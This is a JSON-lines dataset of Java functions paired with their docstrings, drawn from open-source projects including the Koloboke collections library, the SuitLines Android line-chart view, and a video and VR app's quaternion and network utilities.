{"docstring": "/* if float|double value */\n", "func_signal": "public void testContains_specialNotContainedButAllowed()", "code": "{\n    assertFalse(\"containsValue(\" + specialValue() + \") should return false\",\n            getMap().containsValue(specialValue()));\n}", "path": "lib\\testing\\src\\main\\javaTemplates\\com\\koloboke\\collect\\testing\\map\\testers\\CharShortMapContainsValueTester.java", "repo_name": "leventov/Koloboke", "stars": 980, "license": "None", "language": "java", "size": 39039}
{"docstring": "/**\n * Returns a {@link java.util.Map.Entry} equivalence for the given key and value equivalences.\n *\n * @param keyEquivalence the entry key equivalence\n * @param valueEquivalence the entry value equivalence\n * @param <K> the entry key type\n * @param <V> the entry value type\n * @return a {@link java.util.Map.Entry} equivalence for the given key and value equivalences\n */\n", "func_signal": "@Nonnull\npublic static <K, V> Equivalence<Map.Entry<K, V>> entryEquivalence(\n        @Nonnull Equivalence<K> keyEquivalence, @Nonnull Equivalence<V> valueEquivalence)", "code": "{\n    if (keyEquivalence.equals(defaultEquality()) && valueEquivalence.equals(defaultEquality()))\n        return defaultEquality();\n    return new AutoValue_Equivalence_EntryEquivalence<K, V>(keyEquivalence, valueEquivalence);\n}", "path": "lib\\api\\src\\main\\java\\com\\koloboke\\collect\\Equivalence.java", "repo_name": "leventov/Koloboke", "stars": 980, "license": "None", "language": "java", "size": 39039}
{"docstring": "/* endwith */\n", "func_signal": "public static void main(String[] args) throws RunnerException, CommandLineOptionException", "code": "{\n    new DimensionedJmh(AddRemoveWithTombstonesBenchmarks.class)\n            .addArgDim(\"size\", SMALL_SIZE, LARGE_SIZE)\n            .addArgDim(\"lookupsPerInsertion\", 4)\n            .addArgDim(\"loadFactor\")\n            .addArgDim(\"rehashLoad\")\n            .dynamicOperationsPerIteration()\n            .run(args);\n}", "path": "benchmarks\\research\\src\\main\\javaTemplates\\com\\koloboke\\collect\\research\\hash\\AddRemoveWithTombstonesBenchmarks.java", "repo_name": "leventov/Koloboke", "stars": 980, "license": "None", "language": "java", "size": 39039}
{"docstring": "/**\n * \u91cd\u65b0\u8ba1\u7b97\u4e09\u4e2a\u533a\u57df\u7684\u5927\u5c0f\n */\n", "func_signal": "private void calcAreas()", "code": "{\n    float textWidth = Math.max(xyPaint.measureText(String.valueOf(minAndMaxOfY[0])),\n            xyPaint.measureText(String.valueOf(minAndMaxOfY[1])));\n    float maxWidth = Math.max(xyPaint.measureText(\"00\"), textWidth);\n    RectF validArea = new RectF(getPaddingLeft() + basePadding, getPaddingTop() + basePadding,\n            getMeasuredWidth() - getPaddingRight() - basePadding, getMeasuredHeight() - getPaddingBottom());\n    yArea = new RectF(validArea.left, validArea.top,\n            validArea.left + maxWidth + basePadding,\n            validArea.bottom - Util.getTextHeight(xyPaint) - basePadding * 2);\n    xArea = new RectF(yArea.right, yArea.bottom, validArea.right, validArea.bottom);\n    linesArea = new RectF(yArea.right+1, yArea.top, xArea.right, yArea.bottom);\n    hintArea = new RectF(linesArea.right-linesArea.right/4,linesArea.top,\n            linesArea.right,linesArea.top + linesArea.height()/4);\n}", "path": "lib\\src\\main\\java\\tech\\linjiang\\suitlines\\SuitLines.java", "repo_name": "whataa/SuitLines", "stars": 873, "license": "None", "language": "java", "size": 102}
{"docstring": "/**\n * \u4e00\u6761\u7ebf\u904d\u5386\u5b8c\u7684\u65f6\u95f4\uff0c\n *\n * @return\n */\n", "func_signal": "private long calcVisibleLineCost()", "code": "{\n    if (intervalOfAnimCost > 0) {\n        if (maxOfVisible < datas.get(0).size()) {\n            return maxOfAnimCost;\n        }\n        long oneLineCost = intervalOfAnimCost * (datas.get(0).size() - 1);\n        oneLineCost = Math.min(maxOfAnimCost, oneLineCost);\n        return oneLineCost;\n    } else {\n        return 0;\n    }\n}", "path": "lib\\src\\main\\java\\tech\\linjiang\\suitlines\\SuitLines.java", "repo_name": "whataa/SuitLines", "stars": 873, "license": "None", "language": "java", "size": 102}
{"docstring": "/**\n * \u5173\u95ed\u8fb9\u7f18\u6548\u679c\uff0c\u9ed8\u8ba4\u5f00\u542f\n */\n", "func_signal": "public void disableEdgeEffect()", "code": "{\n    needEdgeEffect = false;\n    postInvalidate();\n}", "path": "lib\\src\\main\\java\\tech\\linjiang\\suitlines\\SuitLines.java", "repo_name": "whataa/SuitLines", "stars": 873, "license": "None", "language": "java", "size": 102}
{"docstring": "/**\n * \u5f97\u5230maxValueOfY\n * @param datas\n */\n", "func_signal": "private void calcMaxUnit(Map<Integer, List<Unit>> datas)", "code": "{\n    // \u5148\u201c\u6241\u5e73\u201d\n    List<Unit> allUnits = new ArrayList<>();\n    for (List<Unit> line : datas.values()) {\n        allUnits.addAll(line);\n    }\n    // \u518d\u62f7\u8d1d\uff0c\u9632\u6b62\u5f15\u7528\u95ee\u9898\n    List<Unit> bakUnits = new ArrayList<>();\n    for (int i = 0; i < allUnits.size(); i++) {\n        bakUnits.add(allUnits.get(i).clone());\n    }\n    // \u6700\u540e\u6392\u5e8f\uff0c\u5f97\u5230\u6700\u5927\u503c\n    Collections.sort(bakUnits);\n    Unit maxUnit = bakUnits.get(bakUnits.size() - 1);\n    Unit minUnit = bakUnits.get(0);\n    minAndMaxOfY[0] = Util.getCeil5(Math.min(minUnit.getValue(), 0));\n    minAndMaxOfY[1] = Util.getCeil5(Math.max(maxUnit.getValue(), 0));\n}", "path": "lib\\src\\main\\java\\tech\\linjiang\\suitlines\\SuitLines.java", "repo_name": "whataa/SuitLines", "stars": 873, "license": "None", "language": "java", "size": 102}
{"docstring": "/**\n * \u8bbe\u7f6exy\u8f74\u6587\u5b57\u5927\u5c0f\n * @param sp\n */\n", "func_signal": "public void setXySize(float sp)", "code": "{\n    defaultXySize = sp;\n    xyPaint.setTextSize(Util.size2sp(defaultXySize, getContext()));\n    if (!datas.isEmpty()) {\n        invalidateYBuffer();\n        calcAreas();\n        calcUnitXY();\n        offset = 0;// fix bug.\n        forceToDraw = true;\n        postInvalidate();\n    }\n}", "path": "lib\\src\\main\\java\\tech\\linjiang\\suitlines\\SuitLines.java", "repo_name": "whataa/SuitLines", "stars": 873, "license": "None", "language": "java", "size": 102}
{"docstring": "/**\n * \u8bbe\u7f6exy\u8f74\u6587\u5b57\u7684\u989c\u8272\n * @param color \u9ed8\u8ba4\u4e3aColor.GRAY\n */\n", "func_signal": "public void setXyColor(int color)", "code": "{\n    defaultXyColor = color;\n    xyPaint.setColor(defaultXyColor);\n    if (!datas.isEmpty()) {\n        invalidateYBuffer();\n        forceToDraw = true;\n        postInvalidate();\n    }\n}", "path": "lib\\src\\main\\java\\tech\\linjiang\\suitlines\\SuitLines.java", "repo_name": "whataa/SuitLines", "stars": 873, "license": "None", "language": "java", "size": 102}
{"docstring": "/**\n * \u5f00\u59cb\u8fde\u63a5\u6bcf\u6761\u7ebf\u7684\u5404\u4e2a\u70b9<br>\n * \u6700\u8017\u8d39\u6027\u80fd\u7684\u5730\u65b9\uff1acanvas.drawPath\n * @param canvas\n * @param startIndex\n * @param endIndex\n */\n", "func_signal": "private void drawLines(Canvas canvas, int startIndex, int endIndex)", "code": "{\n    for (int i = 0; i < paths.size(); i++) {\n        paths.get(i).reset();\n    }\n    for (int i = startIndex; i <= endIndex; i++) {\n        for (int j = 0; j < datas.size(); j++) {\n            Unit current = datas.get(j).get(i);\n            float curY = zeroAxisValue - (zeroAxisValue - current.getXY().y) * current.getPercent();\n            if (i == startIndex) {\n                paths.get(j).moveTo(current.getXY().x, curY);\n                continue;\n            }\n            if (lineType == SEGMENT) {\n                paths.get(j).lineTo(current.getXY().x, curY);\n            } else if (lineType == CURVE) {\n                // \u5230\u8fd9\u91cc\u80af\u5b9a\u4e0d\u662f\u8d77\u59cb\u70b9\uff0c\u6240\u4ee5\u53ef\u4ee5\u51cf1\n                Unit previous = datas.get(j).get(i - 1);\n                // \u4e24\u4e2a\u951a\u70b9\u7684\u5750\u6807x\u4e3a\u4e2d\u70b9\u7684x\uff0cy\u5206\u522b\u662f\u4e24\u4e2a\u8fde\u63a5\u70b9\u7684y\n                paths.get(j).cubicTo((previous.getXY().x + current.getXY().x) / 2,\n                        zeroAxisValue - (zeroAxisValue - previous.getXY().y) * previous.getPercent(),\n                        (previous.getXY().x + current.getXY().x) / 2, curY,\n                        current.getXY().x, curY);\n            }\n            if (!needCoverLine && isLineFill() && i == endIndex) {\n                paths.get(j).lineTo(current.getXY().x, linesArea.bottom);\n                paths.get(j).lineTo(datas.get(j).get(startIndex).getXY().x, linesArea.bottom);\n                paths.get(j).close();\n            }\n        }\n    }\n    drawExsitDirectly(canvas);\n}", "path": "lib\\src\\main\\java\\tech\\linjiang\\suitlines\\SuitLines.java", "repo_name": "whataa/SuitLines", "stars": 873, "license": "None", "language": "java", "size": 102}
{"docstring": "/**\n * \u8bbe\u7f6eline\u7684\u5f62\u6001\uff1a\u662f\u5426\u586b\u5145\n * @param isFill    \u9ed8\u8ba4\u4e3afalse\n */\n", "func_signal": "public void setLineForm(boolean isFill)", "code": "{\n    if (isFill) {\n        basePaint.setStyle(Paint.Style.FILL);\n    } else {\n        basePaint.setStyle(Paint.Style.STROKE);\n    }\n    if (!datas.isEmpty()) {\n        // \u540c\u65f6\u66f4\u65b0\u5f53\u524d\u5df2\u5b58\u5728\u7684paint\n        for (int i = 0; i < paints.size(); i++) {\n            forceToDraw = true;\n            paints.get(i).setStyle(basePaint.getStyle());\n        }\n        postInvalidate();\n    }\n}", "path": "lib\\src\\main\\java\\tech\\linjiang\\suitlines\\SuitLines.java", "repo_name": "whataa/SuitLines", "stars": 873, "license": "None", "language": "java", "size": 102}
{"docstring": "/**\n * \u8bbe\u7f6e\u63d0\u793a\u8f85\u52a9\u7ebf\u3001\u6587\u5b57\u989c\u8272\n * @param hintColor\n */\n", "func_signal": "public void setHintColor(int hintColor)", "code": "{\n    needShowHint = true;\n    this.hintColor = hintColor;\n    hintPaint.setColor(hintColor);\n    if (!datas.isEmpty()) {\n        if (clickIndexs != null) {\n            postInvalidate();\n        }\n    }\n}", "path": "lib\\src\\main\\java\\tech\\linjiang\\suitlines\\SuitLines.java", "repo_name": "whataa/SuitLines", "stars": 873, "license": "None", "language": "java", "size": 102}
{"docstring": "/**\n * \u76f4\u63a5draw\u73b0\u6210\u7684\n * @param canvas\n */\n", "func_signal": "private void drawExsitDirectly(Canvas canvas)", "code": "{\n    // TODO \u9700\u8981\u4f18\u5316\n    for (int j = 0; j < datas.size(); j++) {\n        if (!isLineFill() || !needCoverLine) {\n            canvas.drawPath(paths.get(j), paints.get(j));\n        } else {\n            if (needCoverLine) {\n                coverLinePaint.setColor(Util.tryGetStartColorOfLinearGradient((LinearGradient) paints.get(j).getShader()));\n                canvas.save();\n                canvas.clipRect(linesArea.left - offset, linesArea.top, linesArea.right - offset, linesArea.bottom);\n                // \u7531\u4e8epaint\u7684stroke\u662f\u53cc\u8fb9\uff0c\u6240\u4ee5\u4e0b\u4e00\u4e2adraw\u4e0d\u4f1a\u8986\u76d6\u5f53\u524d\u5df2\u7ecf\u7684draw\n                canvas.drawPath(paths.get(j), coverLinePaint);\n                canvas.restore();\n                tmpPath.set(paths.get(j));\n                tmpPath.lineTo(datas.get(j).get(suitEdge[1]).getXY().x, linesArea.bottom);\n                tmpPath.lineTo(datas.get(j).get(suitEdge[0]).getXY().x, linesArea.bottom);\n                tmpPath.close();\n                canvas.drawPath(tmpPath, paints.get(j));\n                tmpPath.reset();\n            }\n        }\n    }\n    // TODO \u753b\u70b9\n}", "path": "lib\\src\\main\\java\\tech\\linjiang\\suitlines\\SuitLines.java", "repo_name": "whataa/SuitLines", "stars": 873, "license": "None", "language": "java", "size": 102}
{"docstring": "/**\n * \u8bbe\u7f6e\u9ed8\u8ba4\u4e00\u6761line\u65f6\u7684\u989c\u8272\n * @param colors    \u9ed8\u8ba4\u4e3adefaultLineColor\n */\n", "func_signal": "public void setDefaultOneLineColor(int...colors)", "code": "{\n    if (colors == null || colors.length < 1) return;\n    defaultLineColor = colors;\n    basePaint.setColor(colors[0]);\n    if (linesArea != null) {// \u533a\u57df\u8fd8\u672a\u521d\u59cb\u5316\n        basePaint.setShader(buildPaintColor(colors));\n    }\n    if (!datas.isEmpty() && datas.size() == 1) {\n        paints.get(0).set(basePaint);\n        postInvalidate();\n    }\n}", "path": "lib\\src\\main\\java\\tech\\linjiang\\suitlines\\SuitLines.java", "repo_name": "whataa/SuitLines", "stars": 873, "license": "None", "language": "java", "size": 102}
{"docstring": "/**\n * 1. ax+b >= y\n * 2. a(x+1)+b <= y\n * \u5f97\u5230\uff1a (int)x = (y-b) / a\n * \u7531\u4e8e y = b - offset\n * \u6240\u4ee5\uff1a(int)x = |offset| / a\n * @return\n */\n", "func_signal": "private int[] findSuitEdgeInVisual2()", "code": "{\n    int startIndex, endIndex;\n    if (offset == 0) {// \u4e0d\u53ef\u6ed1\u52a8\u6216\u5f53\u524d\u4f4d\u4e8e\u6700\u5de6\u8fb9\n        startIndex = 0;\n        endIndex = Math.min(datas.get(0).size() - 1, maxOfVisible - 1);\n    } else if (Math.abs(offset) == maxOffset) {// \u53ef\u6ed1\u52a8\u4e14\u5f53\u524d\u4f4d\u4e8e\u6700\u53f3\u8fb9\n        endIndex = datas.get(0).size() - 1;\n        startIndex = endIndex - maxOfVisible + 1;\n    } else {\n        startIndex = (int) (Math.abs(offset) / realBetween);\n        endIndex = startIndex + maxOfVisible;\n    }\n    return new int[]{startIndex, endIndex};\n}", "path": "lib\\src\\main\\java\\tech\\linjiang\\suitlines\\SuitLines.java", "repo_name": "whataa/SuitLines", "stars": 873, "license": "None", "language": "java", "size": 102}
{"docstring": "/**\n * \u4f9d\u6b21\u542f\u52a8\u6307\u5b9alabel\u7684\u7ebf\u7684\u6bcf\u4e2a\u53ef\u89c1\u70b9\u7684\u52a8\u753b\uff1b\n *\n * @param startIndex\n * @param endIndex\n */\n", "func_signal": "private void startLineAnim(final int startIndex, final int endIndex)", "code": "{\n    final List<Unit> line = datas.get(curAnimLine);\n    long duration = calcVisibleLineCost();\n    if (duration > 0) {\n        ValueAnimator animator = ValueAnimator.ofInt(startIndex, endIndex);\n        animator.setDuration(duration);\n        animator.setInterpolator(linearInterpolator);\n        animator.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() {\n            @Override\n            public void onAnimationUpdate(ValueAnimator animation) {\n                for (int i = startIndex; i <= (Integer) animation.getAnimatedValue(); i++) {\n                    line.get(i).startAnim(pointInterpolator);\n                }\n            }\n        });\n        animator.addListener(new AnimatorListenerAdapter() {\n            @Override\n            public void onAnimationEnd(Animator animation) {\n                for (int i = startIndex; i <= endIndex; i++) {\n                    line.get(i).startAnim(pointInterpolator);\n                }\n            }\n        });\n        animator.start();\n        animators.add(animator);\n    } else {\n        for (int i = startIndex; i <= endIndex; i++) {\n            line.get(i).startAnim(pointInterpolator);\n        }\n    }\n}", "path": "lib\\src\\main\\java\\tech\\linjiang\\suitlines\\SuitLines.java", "repo_name": "whataa/SuitLines", "stars": 873, "license": "None", "language": "java", "size": 102}
{"docstring": "/**\n * \u6ed1\u52a8\u65b9\u6cd5\uff0c\u540c\u65f6\u68c0\u6d4b\u8fb9\u7f18\u6761\u4ef6\n *\n * @param deltaX\n */\n", "func_signal": "private void onScroll(float deltaX)", "code": "{\n    offset += deltaX;\n    offset = offset > 0 ? 0 : (Math.abs(offset) > maxOffset) ? -maxOffset : offset;\n    invalidate();\n}", "path": "lib\\src\\main\\java\\tech\\linjiang\\suitlines\\SuitLines.java", "repo_name": "whataa/SuitLines", "stars": 873, "license": "None", "language": "java", "size": 102}
{"docstring": "/**\n * \u8c03\u7528\u8be5\u65b9\u6cd5\u5f00\u59cb\u586b\u5145\u6570\u636e\uff0c\u8be5\u65b9\u6cd5\u9700\u8981\u4fdd\u8bc1SuitLines\u5df2\u7ecf\u521d\u59cb\u5316\n * @param suitLines \u9700\u8981\u88ab\u586b\u5145\u7684\u56fe\u8868\n * @param needAnim  \u662f\u5426\u9700\u8981\u52a8\u753b\n */\n", "func_signal": "public void build(final SuitLines suitLines, final boolean needAnim)", "code": "{\n    final List<Paint> tmpPaints = new ArrayList<>();\n    for (int i = 0; i < colors.size(); i++) {\n        Paint paint = suitLines.buildNewPaint();\n        paint.setColor(colors.get(0)[0]);\n        paint.setShader(suitLines.buildPaintColor(colors.get(i)));\n        tmpPaints.add(i, paint);\n    }\n    suitLines.postAction(new Runnable() {\n        @Override\n        public void run() {\n            suitLines.feedInternal(datas, tmpPaints, needAnim);\n        }\n    });\n}", "path": "lib\\src\\main\\java\\tech\\linjiang\\suitlines\\SuitLines.java", "repo_name": "whataa/SuitLines", "stars": 873, "license": "None", "language": "java", "size": 102}
{"docstring": "/**\n * \u8bbe\u7f6eline\u7684SEGMENT\u65f6\u7684\u5927\u5c0f\n * @param lineSize\n */\n", "func_signal": "public void setLineSize(float lineSize)", "code": "{\n    basePaint.setStyle(Paint.Style.STROKE);\n    basePaint.setStrokeWidth(lineSize);\n    // \u540c\u65f6\u66f4\u65b0\u5f53\u524d\u5df2\u5b58\u5728\u7684paint\n    for (int i = 0; i < paints.size(); i++) {\n        forceToDraw = true;\n        paints.get(i).setStyle(basePaint.getStyle());\n        paints.get(i).setStrokeWidth(lineSize);\n    }\n    postInvalidate();\n}", "path": "lib\\src\\main\\java\\tech\\linjiang\\suitlines\\SuitLines.java", "repo_name": "whataa/SuitLines", "stars": 873, "license": "None", "language": "java", "size": 102}
{"docstring": "/**\n * \u672c\u65b9\u5f0f\u4ec5\u652f\u6301\u4e00\u6761\u7ebf\uff0c\u82e5\u9700\u8981\u652f\u6301\u591a\u6761\u7ebf\uff0c\u8bf7\u91c7\u7528Builder\u65b9\u5f0f\n *\n * @param line\n */\n", "func_signal": "public void feedWithAnim(List<Unit> line)", "code": "{\n    if (line == null || line.isEmpty()) return;\n    final Map<Integer, List<Unit>> entry = new HashMap<>();\n    entry.put(0, line);\n    handler.post(new Runnable() {\n        @Override\n        public void run() {\n            feedInternal(entry, Arrays.asList(buildNewPaint()), true);\n        }\n    });\n}", "path": "lib\\src\\main\\java\\tech\\linjiang\\suitlines\\SuitLines.java", "repo_name": "whataa/SuitLines", "stars": 873, "license": "None", "language": "java", "size": 102}
{"docstring": "/**\n * \u627e\u5230\u5f53\u524d\u53ef\u89c1\u533a\u95f4\u5185\u5408\u9002\u7684\u4e24\u4e2a\u8fb9\u7f18\u70b9\uff0c\u6ce8\u610f\u5982\u679c\u8fb9\u7f18\u70b9\u4e0d\u5728\u53ef\u89c1\u533a\u95f4\u7684\u8fb9\u7f18\uff0c\u5219\u9700\u8981\u5305\u542b\u4e0b\u4e00\u4e2a\u4e0d\u53ef\u89c1\u7684\u70b9\n *\n * @return\n */\n", "func_signal": "private int[] findSuitEdgeInVisual()", "code": "{\n    int startIndex = 0, endIndex = datas.get(0).size() - 1;\n    if (offset == 0) {// \u4e0d\u53ef\u6ed1\u52a8\u6216\u5f53\u524d\u4f4d\u4e8e\u6700\u5de6\u8fb9\n        startIndex = 0;\n        endIndex = Math.min(datas.get(0).size() - 1, maxOfVisible - 1);\n    } else if (Math.abs(offset) == maxOffset) {// \u53ef\u6ed1\u52a8\u4e14\u5f53\u524d\u4f4d\u4e8e\u6700\u53f3\u8fb9\n        endIndex = datas.get(0).size() - 1;\n        startIndex = endIndex - maxOfVisible + 1;\n    } else {\n        float startX = linesArea.left - offset;\n        float endX = linesArea.right - offset;\n        if (datas.get(0).size() > maxOfVisible) {\n            // \u627e\u5230\u6307\u5b9a\u533a\u95f4\u7684\u7b2c\u4e00\u4e2a\u88ab\u53d1\u73b0\u7684\u70b9\n            int suitKey = 0;\n            int low = 0;\n            int high = datas.get(0).size() - 1;\n            List<Unit> i = datas.get(0);\n            while (low <= high) {\n                int mid = (low + high) >>> 1;\n                Unit midVal = i.get(mid);\n                if (midVal.getXY().x < startX) {\n                    low = mid + 1;\n                } else if (midVal.getXY().x > endX) {\n                    high = mid - 1;\n                } else {\n                    suitKey = mid;\n                    break;\n                }\n            }\n            int bakKey = suitKey;\n            // \u5148\u5de6\u8fb9\n            while (suitKey >= 0) {\n                startIndex = suitKey;\n                if (datas.get(0).get(suitKey).getXY().x <= startX) {\n                    break;\n                }\n                suitKey--;\n            }\n            suitKey = bakKey;\n            // \u518d\u53f3\u8fb9\n            while (suitKey < datas.get(0).size()) {\n                endIndex = suitKey;\n                if (datas.get(0).get(suitKey).getXY().x >= endX) {\n                    break;\n                }\n                suitKey++;\n            }\n        }\n    }\n    return new int[]{startIndex, endIndex};\n}", "path": "lib\\src\\main\\java\\tech\\linjiang\\suitlines\\SuitLines.java", "repo_name": "whataa/SuitLines", "stars": 873, "license": "None", "language": "java", "size": 102}
{"docstring": "/**\n * \u753bx\u8f74,\u9ed8\u8ba4\u53d6\u7b2c\u4e00\u6761\u7ebf\u7684\u503c\n * @param canvas\n * @param startIndex\n * @param endIndex\n */\n", "func_signal": "private void drawX(Canvas canvas, int startIndex, int endIndex)", "code": "{\n    canvas.drawLine(datas.get(0).get(startIndex).getXY().x, xArea.top,\n            datas.get(0).get(endIndex).getXY().x, xArea.top, xyPaint);\n    for (int i = startIndex; i <= endIndex; i++) {\n        String extX = datas.get(0).get(i).getExtX();\n        if (TextUtils.isEmpty(extX)) {\n            continue;\n        }\n        if (i == startIndex && startIndex == 0) {\n            xyPaint.setTextAlign(Paint.Align.LEFT);\n        } else if (i == endIndex && endIndex == datas.get(0).size()-1) {\n            xyPaint.setTextAlign(Paint.Align.RIGHT);\n        } else {\n            xyPaint.setTextAlign(Paint.Align.CENTER);\n        }\n        canvas.drawText(extX, datas.get(0).get(i).getXY().x, Util.calcTextSuitBaseY(xArea, xyPaint), xyPaint);\n        canvas.drawLine(datas.get(0).get(i).getXY().x, xArea.top,\n                datas.get(0).get(i).getXY().x, xArea.top+basePadding, xyPaint);\n    }\n}", "path": "lib\\src\\main\\java\\tech\\linjiang\\suitlines\\SuitLines.java", "repo_name": "whataa/SuitLines", "stars": 873, "license": "None", "language": "java", "size": 102}
{"docstring": "/**\n * \u8fb9\u7f18\u70b9\u5728\u53ef\u89c1\u533a\u57df\u4e24\u4fa7\u65f6\u4e0d\u9700\u8981\u91cd\u65b0\u8ba1\u7b97<br>\n * \u4f46\u662f\u624b\u6307\u6ed1\u52a8\u8d8a\u5feb\uff0c\u8be5\u5206\u652f\u7684\u6709\u6548\u6548\u679c\u8d8a\u5dee\n * @param offset\n * @return\n */\n", "func_signal": "private boolean noNeedCalcEdge(float offset)", "code": "{\n    return suitEdge != null\n            && datas.get(0).get(suitEdge[0]).getXY().x <= linesArea.left - offset\n            && datas.get(0).get(suitEdge[1]).getXY().x >= linesArea.right - offset;\n}", "path": "lib\\src\\main\\java\\tech\\linjiang\\suitlines\\SuitLines.java", "repo_name": "whataa/SuitLines", "stars": 873, "license": "None", "language": "java", "size": 102}
{"docstring": "/** Sets the quaternion to the given euler angles in radians.\n * @param pitch the rotation around the x axis in radians\n * @param yaw the rotation around the y axis in radians\n * @param roll the rotation around the z axis in radians\n * @return this quaternion */\n", "func_signal": "public void setEulerAnglesRad (float pitch, float yaw, float roll)", "code": "{\n    final float hr = roll * 0.5f;\n    final float shr = (float)Math.sin(hr);\n    final float chr = (float)Math.cos(hr);\n    final float hp = pitch * 0.5f;\n    final float shp = (float)Math.sin(hp);\n    final float chp = (float)Math.cos(hp);\n    final float hy = yaw * 0.5f;\n    final float shy = (float)Math.sin(hy);\n    final float chy = (float)Math.cos(hy);\n    final float chy_shp = chy * shp;\n    final float shy_chp = shy * chp;\n    final float chy_chp = chy * chp;\n    final float shy_shp = shy * shp;\n\n    q[1] = (chy_shp * chr) + (shy_chp * shr); // cos(yaw/2) * sin(pitch/2) * cos(roll/2) + sin(yaw/2) * cos(pitch/2) * sin(roll/2)\n    q[2] = (shy_chp * chr) - (chy_shp * shr); // sin(yaw/2) * cos(pitch/2) * cos(roll/2) - cos(yaw/2) * sin(pitch/2) * sin(roll/2)\n    q[3] = (chy_chp * shr) - (shy_shp * chr); // cos(yaw/2) * cos(pitch/2) * sin(roll/2) - sin(yaw/2) * sin(pitch/2) * cos(roll/2)\n\n    // w\n    q[0] = (chy_chp * chr) + (shy_shp * shr); // cos(yaw/2) * cos(pitch/2) * cos(roll/2) + sin(yaw/2) * sin(pitch/2) * sin(roll/2)\n}", "path": "vrlib\\src\\main\\java\\com\\asha\\vrlib\\model\\MDQuaternion.java", "repo_name": "Cuieney/kotlin-life", "stars": 862, "license": "None", "language": "java", "size": 124338}
{"docstring": "/**\n * \u8df3\u8f6c\u5230\u89c6\u9891\u64ad\u653e\n *\n * @param activity\n * @param view\n */\n", "func_signal": "public static void goToVideoPlayer(Activity activity, View view, DataBean dataBean)", "code": "{\n    Intent intent = new Intent(activity, PlayActivity.class);\n    Bundle bundle = new Bundle();\n    bundle.putParcelable(PlayActivity.DATA,dataBean);\n    intent.putExtras(bundle);\n    intent.putExtra(PlayActivity.TRANSITION, true);\n    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {\n        Pair pair = new Pair<>(view, PlayActivity.IMG_TRANSITION);\n        ActivityOptionsCompat activityOptions = ActivityOptionsCompat.makeSceneTransitionAnimation(\n                activity, pair);\n        ActivityCompat.startActivity(activity, intent, activityOptions.toBundle());\n    } else {\n        activity.startActivity(intent);\n        activity.overridePendingTransition(R.anim.abc_fade_in, R.anim.abc_fade_out);\n    }\n}", "path": "app\\src\\main\\java\\org\\cuieney\\videolife\\ui\\video\\JumpUtils.java", "repo_name": "Cuieney/kotlin-life", "stars": 862, "license": "None", "language": "java", "size": 124338}
{"docstring": "/** Get the yaw euler angle in radians, which is the rotation around the y axis. Requires that this quaternion is normalized.\n * @return the rotation around the y axis in radians (between -PI and +PI) */\n", "func_signal": "public float getYawRad ()", "code": "{\n    float w = q[0];\n    float x = q[1];\n    float y = q[2];\n    float z = q[3];\n\n    return getGimbalPole() == 0 ? MathUtils.atan2(2f * (y * w + x * z), 1f - 2f * (y * y + x * x)) : 0f;\n}", "path": "vrlib\\src\\main\\java\\com\\asha\\vrlib\\model\\MDQuaternion.java", "repo_name": "Cuieney/kotlin-life", "stars": 862, "license": "None", "language": "java", "size": 124338}
{"docstring": "/**\n * @return netType \u8fd4\u56de\u7c7b\u578b\n * @throws\n * @\u65b9\u6cd5\u540d: getAPNType\n * @\u8bf4 \u660e: \u83b7\u53d6\u5f53\u524d\u7684\u7f51\u7edc\u72b6\u6001 -1\uff1a\u6ca1\u6709\u7f51\u7edc 1\uff1aWIFI\u7f51\u7edc2\uff1awap \u7f51\u7edc3\uff1anet\u7f51\u7edc\n * @\u53c2 \u6570: @param context\n * @\u53c2 \u6570: @return\n */\n", "func_signal": "public static NetType getNetworkType(Context context)", "code": "{\n    NetType netType = null;\n    ConnectivityManager manager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);\n    NetworkInfo networkInfo = manager.getActiveNetworkInfo();\n    if (networkInfo != null && networkInfo.isConnected()) {\n        if (networkInfo.getType() == ConnectivityManager.TYPE_WIFI) {\n            netType = NetType.NETWORK_WIFI;\n        } else if (networkInfo.getType() == ConnectivityManager.TYPE_MOBILE) {\n\n            // TD-SCDMA   networkType is 17\n            int networkType = networkInfo.getSubtype();\n            switch (networkType) {\n                case TelephonyManager.NETWORK_TYPE_GPRS:\n                case TelephonyManager.NETWORK_TYPE_EDGE:\n                case TelephonyManager.NETWORK_TYPE_CDMA:\n                case TelephonyManager.NETWORK_TYPE_1xRTT:\n                case TelephonyManager.NETWORK_TYPE_IDEN: //api<8 : replace by 11\n                    netType = NetType.NETWORK_2_G;\n                    break;\n                case TelephonyManager.NETWORK_TYPE_UMTS:\n                case TelephonyManager.NETWORK_TYPE_EVDO_0:\n                case TelephonyManager.NETWORK_TYPE_EVDO_A:\n                case TelephonyManager.NETWORK_TYPE_HSDPA:\n                case TelephonyManager.NETWORK_TYPE_HSUPA:\n                case TelephonyManager.NETWORK_TYPE_HSPA:\n                case TelephonyManager.NETWORK_TYPE_EVDO_B: //api<9 : replace by 14\n                case TelephonyManager.NETWORK_TYPE_EHRPD:  //api<11 : replace by 12\n                case TelephonyManager.NETWORK_TYPE_HSPAP:  //api<13 : replace by 15\n                    netType = NetType.NETWORK_3_G;\n                    break;\n                case TelephonyManager.NETWORK_TYPE_LTE:    //api<11 : replace by 13\n                    netType = NetType.NETWORK_4_G;\n                    break;\n                default:\n                    String typeName = networkInfo.getSubtypeName();\n                    // http://baike.baidu.com/item/TD-SCDMA \u4e2d\u56fd\u79fb\u52a8 \u8054\u901a \u7535\u4fe1 \u4e09\u79cd3G\u5236\u5f0f\n                    if (typeName.equalsIgnoreCase(\"TD-SCDMA\") || typeName.equalsIgnoreCase(\"WCDMA\") || typeName.equalsIgnoreCase(\"CDMA2000\")) {\n                        netType = NetType.NETWORK_3_G;\n                    } else {\n                        netType = NetType.NETWORK_UNKNOWN;\n                    }\n                    break;\n            }\n        }\n    }\n\n    return netType;\n}", "path": "app\\src\\main\\java\\org\\cuieney\\videolife\\common\\net\\NetWorkUtil.java", "repo_name": "Cuieney/kotlin-life", "stars": 862, "license": "None", "language": "java", "size": 124338}
{"docstring": "// delegate\n", "func_signal": "public MDHotspotBuilder title(String title)", "code": "{\n    builderDelegate.title(title);\n    return this;\n}", "path": "vrlib\\src\\main\\java\\com\\asha\\vrlib\\model\\MDHotspotBuilder.java", "repo_name": "Cuieney/kotlin-life", "stars": 862, "license": "None", "language": "java", "size": 124338}
